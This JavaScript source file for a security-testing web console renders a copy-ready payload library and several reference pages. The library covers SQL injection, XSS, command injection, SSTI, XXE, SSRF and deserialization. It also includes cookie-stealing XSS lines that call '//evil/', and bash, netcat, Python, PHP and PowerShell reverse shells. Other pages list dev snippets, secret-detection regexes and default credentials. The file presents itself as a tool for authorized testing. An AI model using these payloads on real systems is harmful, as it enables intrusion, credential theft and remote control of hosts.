// Big reference libraries for the console: attack payloads and dev/code snippets.
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

export const PAYLOADS = {
  "SQL injection": [
    "' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' OR '1'='1' /*", "\" OR \"\"=\"",
    "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -", "' ORDER BY 1-- -",
    "' AND 1=CONVERT(int,(SELECT @@version))-- -", "' AND SLEEP(5)-- -",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -", "1' AND extractvalue(1,concat(0x7e,version()))-- -",
    "'; DROP TABLE users-- -", "UNION SELECT username,password FROM users-- -", "' OR 1=1 LIMIT 1-- -",
  ],
  "XSS": [
    "<script>alert(1)</script>", "\"><script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>", "\"><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "<body onload=alert(1)>", "javascript:alert(1)", "'\"><svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>", "<img src=1 onerror=fetch('//evil/'+document.cookie)>",
    "<script>new Image().src='//evil/?c='+document.cookie</script>",
  ],
  "Local file inclusion": [
    "../../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=config.php", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
    "expect://id", "/var/log/apache2/access.log", "..\\..\\..\\windows\\win.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
  ],
  "Command injection": [
    "; id", "| id", "|| id", "& whoami", "&& whoami", "`id`", "$(id)", "; sleep 5",
    "; cat /etc/passwd", "|nc -e /bin/sh 10.0.0.1 4444", "; curl http://evil/$(whoami)",
    "%0a id", "\n/bin/cat /etc/passwd", "'; ping -c 3 10.0.0.1;'",
  ],
  "SSTI (template injection)": [
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}",
    "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}", "*{7*7}", "@(7*7)",
  ],
  "XXE": [
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
    "<!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>",
    "<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://evil/e.dtd\"> %x;]>",
    "<!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>",
  ],
  "SSRF": [
    "http://127.0.0.1:80", "http://localhost/admin", "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::1]/", "http://0.0.0.0:8080", "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
    "http://metadata.google.internal/computeMetadata/v1/",
  ],
  "Auth / logic bypass": [
    "admin' -- ", "' OR ''='", "true", "1' or '1'='1", "{\"$ne\":null}", "{\"$gt\":\"\"}",
    "X-Forwarded-For: 127.0.0.1", "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
    "Referer: https://trusted.site", "role=admin", "isAdmin=true",
  ],
  "Reverse shells": [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "nc -e /bin/sh 10.0.0.1 4444",
    "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
    "php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
    "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream()...\"",
  ],
  "NoSQL injection": [
    "{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}", "'||'1'=='1", "{\"$where\":\"sleep(5000)\"}",
    "admin'||''=='", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "username[$ne]=x&password[$ne]=y",
  ],
  "LDAP injection": ["*", "*)(uid=*))(|(uid=*", "*)(|(objectClass=*", "admin)(&)", "*)(mail=*", "*))%00"],
  "CRLF / header injection": [
    "%0d%0aSet-Cookie:sessid=hacked", "%0d%0aLocation:https://evil.com", "%0d%0a%0d%0a<script>alert(1)</script>",
    "test%0d%0aContent-Length:0%0d%0a%0d%0a", "%E5%98%8D%E5%98%8ASet-Cookie:x=1",
  ],
  "Open redirect": [
    "//evil.com", "https://evil.com", "/\\/evil.com", "https:evil.com", "//google.com%2f%2f@evil.com",
    "?next=//evil.com", "?url=javascript:alert(document.domain)", "////evil.com",
  ],
  "JWT attacks": [
    "alg:none  { \"alg\":\"none\",\"typ\":\"JWT\" }  (strip signature)",
    "RS256->HS256 confusion: sign HS256 with the RS256 public key",
    "weak HS256 secret: hashcat -m 16500 token.jwt rockyou.txt",
    "kid path traversal: \"kid\":\"../../../../dev/null\"",
    "jku / x5u pointing to an attacker-hosted JWKS",
  ],
  "Deserialization": [
    "Java: java -jar ysoserial.jar CommonsCollections1 'id' | base64",
    "PHP: phpggc Monolog/RCE1 system id", "Python pickle: __reduce__ -> (os.system,('id',))",
    ".NET: ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c \"id\"",
    "Node: _$$ND_FUNC$$_function(){require('child_process').exec('id')}()",
  ],
};

export const SNIPPETS = {
  "Bash": [
    ["Strict mode", "set -euo pipefail"], ["Loop files", "for f in *.txt; do echo \"$f\"; done"],
    ["Trap cleanup", "trap 'rm -f \"$tmp\"' EXIT"], ["Read line-by-line", "while read -r l; do echo \"$l\"; done < file"],
    ["Args w/ default", "name=\"${1:-world}\""],
  ],
  "Python": [
    ["Venv + install", "python3 -m venv .venv && . .venv/bin/activate && pip install requests"],
    ["HTTP GET", "import requests; r = requests.get(url, timeout=10); print(r.status_code)"],
    ["Read JSON", "import json; data = json.load(open('f.json'))"],
    ["f-string", "print(f'{name=} {value:.2f}')"], ["Argparse", "import argparse; p=argparse.ArgumentParser(); p.add_argument('host'); a=p.parse_args()"],
  ],
  "JavaScript / Node": [
    ["Fetch JSON", "const d = await (await fetch(url)).json();"], ["Read file", "const s = require('fs').readFileSync('f','utf8');"],
    ["Env var", "const key = process.env.API_KEY;"], ["Sleep", "await new Promise(r => setTimeout(r, 1000));"],
    ["Server", "require('http').createServer((q,s)=>s.end('hi')).listen(3000)"],
  ],
  "Git": [
    ["Undo last commit", "git reset --soft HEAD~1"], ["Amend", "git commit --amend --no-edit"],
    ["New branch", "git switch -c feature/x"], ["Stash", "git stash && git stash pop"],
    ["Squash last 3", "git rebase -i HEAD~3"], ["Discard changes", "git restore ."],
  ],
  "Docker": [
    ["Run interactive", "docker run -it --rm alpine sh"], ["Build", "docker build -t app ."],
    ["Logs", "docker logs -f <container>"], ["Exec", "docker exec -it <container> bash"],
    ["Compose up", "docker compose up -d"], ["Prune", "docker system prune -af"],
  ],
  "SQL": [
    ["Top rows", "SELECT * FROM t LIMIT 10;"], ["Join", "SELECT a.*, b.name FROM a JOIN b ON b.id=a.b_id;"],
    ["Count group", "SELECT status, COUNT(*) FROM t GROUP BY status;"], ["Upsert (PG)", "INSERT ... ON CONFLICT (id) DO UPDATE SET ..."],
    ["Index", "CREATE INDEX idx_t_col ON t(col);"],
  ],
};

const copyRow = (label, code) => `<div class="cs-line"><div class="cs-label">${esc(label)}</div><div class="cs-cmd"><code>${esc(code)}</code><button class="cs-copy" title="copy">copy</button></div></div>`;
function wireCopy(root) {
  root.addEventListener("click", (e) => {
    const b = e.target.closest(".cs-copy"); if (!b) return;
    const code = b.closest(".cs-cmd").querySelector("code");
    navigator.clipboard?.writeText(code.textContent).then(() => { b.textContent = "copied"; setTimeout(() => (b.textContent = "copy"), 1000); });
  });
}

export function renderPayloads(main) {
  const cats = Object.keys(PAYLOADS);
  main.innerHTML = `
    <h1 class="pg-h1">Payload library</h1>
    <p class="muted pg-sub">Copy-ready payloads for authorized testing. ${Object.values(PAYLOADS).reduce((a, b) => a + b.length, 0)} entries across ${cats.length} classes.</p>
    <div class="cs-filter" id="plFilter"><button class="chip on" data-c="all">All</button>${cats.map((c) => `<button class="chip" data-c="${esc(c)}">${esc(c)}</button>`).join("")}</div>
    <div class="cs-grid" id="plGrid">
      ${cats.map((c) => `<div class="cs-card" data-cat="${esc(c)}"><div class="cs-head"><h3>${esc(c)}</h3><span class="chip">${PAYLOADS[c].length}</span></div>${PAYLOADS[c].map((p, i) => copyRow(c.split(" ")[0] + " #" + (i + 1), p)).join("")}</div>`).join("")}
    </div>`;
  wireCopy(main);
  main.querySelector("#plFilter").onclick = (e) => {
    const b = e.target.closest(".chip"); if (!b) return;
    main.querySelectorAll("#plFilter .chip").forEach((x) => x.classList.toggle("on", x === b));
    main.querySelectorAll("#plGrid .cs-card").forEach((card) => { card.style.display = (b.dataset.c === "all" || card.dataset.cat === b.dataset.c) ? "" : "none"; });
  };
}

export function renderSnippets(main) {
  const langs = Object.keys(SNIPPETS);
  main.innerHTML = `
    <h1 class="pg-h1">Code snippets</h1>
    <p class="muted pg-sub">Handy one-liners for everyday development. Click copy on any line.</p>
    <div class="cs-filter" id="snFilter"><button class="chip on" data-c="all">All</button>${langs.map((l) => `<button class="chip" data-c="${esc(l)}">${esc(l)}</button>`).join("")}</div>
    <div class="cs-grid" id="snGrid">
      ${langs.map((l) => `<div class="cs-card" data-cat="${esc(l)}"><div class="cs-head"><h3>${esc(l)}</h3><span class="chip">${SNIPPETS[l].length}</span></div>${SNIPPETS[l].map(([lbl, code]) => copyRow(lbl, code)).join("")}</div>`).join("")}
    </div>`;
  wireCopy(main);
  main.querySelector("#snFilter").onclick = (e) => {
    const b = e.target.closest(".chip"); if (!b) return;
    main.querySelectorAll("#snFilter .chip").forEach((x) => x.classList.toggle("on", x === b));
    main.querySelectorAll("#snGrid .cs-card").forEach((card) => { card.style.display = (b.dataset.c === "all" || card.dataset.cat === b.dataset.c) ? "" : "none"; });
  };
}

const API_SERVICES = [
  ["shodan", "Shodan", "Host & service search engine"],
  ["virustotal", "VirusTotal", "File / URL / IP reputation"],
  ["openai", "OpenAI", "GPT API key"],
  ["anthropic", "Anthropic", "Claude API key"],
  ["hunter", "Hunter.io", "Email discovery"],
  ["securitytrails", "SecurityTrails", "DNS & domain history"],
  ["abuseipdb", "AbuseIPDB", "IP abuse reports"],
  ["censys", "Censys", "Internet scan data"],
  ["github", "GitHub", "Personal access token"],
];
export function renderApiKeys(main) {
  main.innerHTML = `
    <h1 class="pg-h1">API keys</h1>
    <p class="muted pg-sub">Store keys for the services you use. Saved only in this browser (localStorage) &mdash; never uploaded anywhere.</p>
    <div class="set-card" style="max-width:660px">
      ${API_SERVICES.map(([id, name, desc]) => `<div class="set-row"><span><strong>${esc(name)}</strong> <span class="muted" style="font-size:.74rem">&middot; ${esc(desc)}</span></span><input class="tk-f" data-key="${id}" type="password" placeholder="paste key..." autocomplete="off" style="max-width:240px" value="${esc(localStorage.getItem("sw_key_" + id) || "")}"></div>`).join("")}
    </div>
    <div class="set-btns"><button class="btn" id="akSave">Save keys</button><button class="btn ghost" id="akShow">Show/hide</button><span id="akMsg" class="muted" style="font-size:.8rem;align-self:center"></span></div>`;
  main.querySelector("#akSave").onclick = () => {
    main.querySelectorAll("[data-key]").forEach((i) => { try { localStorage.setItem("sw_key_" + i.dataset.key, i.value.trim()); } catch (_) {} });
    const m = main.querySelector("#akMsg"); m.textContent = "saved to this browser"; setTimeout(() => (m.textContent = ""), 1600);
  };
  main.querySelector("#akShow").onclick = () => main.querySelectorAll("[data-key]").forEach((i) => (i.type = i.type === "password" ? "text" : "password"));
}

// --- Reference library: regex, HTTP status codes, common ports ---
const REGEX = [
  ["Email", "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"],
  ["IPv4", "\\b(?:(?:25[0-5]|2[0-4]\\d|1?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1?\\d?\\d)\\b"],
  ["IPv6", "(?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}"],
  ["URL", "https?://[^\\s\"'<>)]+"],
  ["MAC address", "(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}"],
  ["UUID v4", "[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}"],
  ["MD5 hash", "\\b[a-f0-9]{32}\\b"],
  ["SHA-1 hash", "\\b[a-f0-9]{40}\\b"],
  ["SHA-256 hash", "\\b[a-f0-9]{64}\\b"],
  ["JWT", "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"],
  ["Private key block", "-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"],
  ["AWS access key", "AKIA[0-9A-Z]{16}"],
  ["Slack token", "xox[baprs]-[0-9A-Za-z-]{10,}"],
  ["Google API key", "AIza[0-9A-Za-z_-]{35}"],
  ["Bearer token header", "Authorization:\\s*Bearer\\s+[A-Za-z0-9._-]+"],
  ["Credit card", "\\b(?:4\\d{3}|5[1-5]\\d{2}|3[47]\\d{2}|6011)[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b"],
  ["Date YYYY-MM-DD", "\\b\\d{4}-(?:0[1-9]|1[0-2])-(?:0[1-9]|[12]\\d|3[01])\\b"],
  ["Hex color", "#[0-9a-fA-F]{6}\\b"],
  ["Domain name", "(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,}"],
  ["Windows path", "[A-Za-z]:\\\\(?:[^\\\\/:*?\"<>|\\r\\n]+\\\\?)*"],
];
const HTTP_STATUS = [
  ["200", "OK"], ["201", "Created"], ["204", "No Content"], ["206", "Partial Content"],
  ["301", "Moved Permanently"], ["302", "Found"], ["304", "Not Modified"], ["307", "Temporary Redirect"], ["308", "Permanent Redirect"],
  ["400", "Bad Request"], ["401", "Unauthorized"], ["403", "Forbidden"], ["404", "Not Found"], ["405", "Method Not Allowed"],
  ["407", "Proxy Auth Required"], ["408", "Request Timeout"], ["409", "Conflict"], ["413", "Payload Too Large"], ["418", "I'm a teapot"],
  ["422", "Unprocessable Entity"], ["429", "Too Many Requests"], ["431", "Header Fields Too Large"],
  ["500", "Internal Server Error"], ["501", "Not Implemented"], ["502", "Bad Gateway"], ["503", "Service Unavailable"], ["504", "Gateway Timeout"],
];
const PORTS = [
  ["21", "FTP"], ["22", "SSH"], ["23", "Telnet"], ["25", "SMTP"], ["53", "DNS"], ["80", "HTTP"], ["110", "POP3"],
  ["135", "MS RPC"], ["139", "NetBIOS"], ["143", "IMAP"], ["389", "LDAP"], ["443", "HTTPS"], ["445", "SMB"],
  ["1433", "MSSQL"], ["1521", "Oracle"], ["3306", "MySQL"], ["3389", "RDP"], ["5432", "PostgreSQL"],
  ["5900", "VNC"], ["6379", "Redis"], ["8080", "HTTP-alt"], ["9200", "Elasticsearch"], ["27017", "MongoDB"],
];
const MIME_TYPES = [
  [".json", "application/json"], [".js", "text/javascript"], [".html", "text/html"], [".xml", "application/xml"],
  [".pdf", "application/pdf"], [".zip", "application/zip"], [".png", "image/png"], [".jpg", "image/jpeg"],
  [".svg", "image/svg+xml"], [".csv", "text/csv"], [".txt", "text/plain"], [".bin", "application/octet-stream"],
  ["form", "application/x-www-form-urlencoded"], ["multipart", "multipart/form-data"], [".wasm", "application/wasm"],
];
const DEFAULT_CREDS = [
  ["Tomcat", "tomcat / tomcat"], ["MySQL", "root / (blank)"], ["PostgreSQL", "postgres / postgres"],
  ["Jenkins", "admin / admin"], ["Grafana", "admin / admin"], ["phpMyAdmin", "root / (blank)"],
  ["Router (common)", "admin / admin"], ["Elasticsearch", "elastic / changeme"], ["MongoDB", "(no auth by default)"],
  ["RabbitMQ", "guest / guest"], ["Redis", "(no auth by default)"], ["WebLogic", "weblogic / welcome1"],
];
export function renderRefs(main) {
  const badge = (code) => { const n = +code; const cls = n < 300 ? "ok" : n < 400 ? "" : n < 500 ? "warn" : "bad"; return `<span class="ref-code ${cls}">${esc(code)}</span>`; };
  main.innerHTML = `
    <h1 class="pg-h1">References</h1>
    <p class="muted pg-sub">Fast lookups you reach for constantly &mdash; regex, HTTP status codes, ports, MIME types, and default credentials.</p>
    <div class="ref-grid">
      <div class="cs-card"><div class="cs-head"><h3>Regex patterns</h3><span class="chip">${REGEX.length}</span></div>
        ${REGEX.map(([lbl, rx]) => copyRow(lbl, rx)).join("")}</div>
      <div class="cs-card"><div class="cs-head"><h3>HTTP status codes</h3><span class="chip">${HTTP_STATUS.length}</span></div>
        ${HTTP_STATUS.map(([c, t]) => `<div class="ref-row">${badge(c)}<span>${esc(t)}</span></div>`).join("")}</div>
      <div class="cs-card"><div class="cs-head"><h3>Common ports</h3><span class="chip">${PORTS.length}</span></div>
        ${PORTS.map(([p, s]) => `<div class="ref-row"><span class="ref-code">${esc(p)}</span><span>${esc(s)}</span></div>`).join("")}</div>
      <div class="cs-card"><div class="cs-head"><h3>MIME types</h3><span class="chip">${MIME_TYPES.length}</span></div>
        ${MIME_TYPES.map(([k, v]) => copyRow(k, v)).join("")}</div>
      <div class="cs-card"><div class="cs-head"><h3>Default credentials</h3><span class="chip">${DEFAULT_CREDS.length}</span></div>
        ${DEFAULT_CREDS.map(([svc, cr]) => `<div class="ref-row"><span class="ref-code" style="min-width:auto;padding:2px 10px">${esc(svc)}</span><span class="mono" style="font-size:.8rem">${esc(cr)}</span></div>`).join("")}</div>
    </div>`;
  wireCopy(main);
}
